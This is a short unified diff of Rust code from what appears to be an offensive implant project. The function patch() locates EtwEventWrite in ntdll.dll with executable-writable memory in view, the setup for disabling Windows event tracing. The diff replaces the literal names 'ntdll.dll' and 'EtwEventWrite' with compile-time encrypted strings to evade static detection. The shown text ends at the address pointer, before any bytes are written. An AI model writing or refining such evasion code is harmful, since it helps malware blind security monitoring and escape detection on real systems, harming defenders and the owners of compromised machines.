@@ -10,10 +10,12 @@ pub fn patch() {
     use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
 
     unsafe {
-        let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr() as _);
+        let ntdll_n = { let mut v = oxide_macros::encrypt_str!("ntdll.dll").into_bytes(); v.push(0); v };
+        let ntdll = GetModuleHandleA(ntdll_n.as_ptr() as _);
         if ntdll == 0 { return; }
 
-        let etw_fn = GetProcAddress(ntdll, c"EtwEventWrite".as_ptr() as _);
+        let etw_n = { let mut v = oxide_macros::encrypt_str!("EtwEventWrite").into_bytes(); v.push(0); v };
+        let etw_fn = GetProcAddress(ntdll, etw_n.as_ptr() as _);
         if etw_fn.is_none() { return; }
 
         let addr = etw_fn.unwrap() as *mut u8;
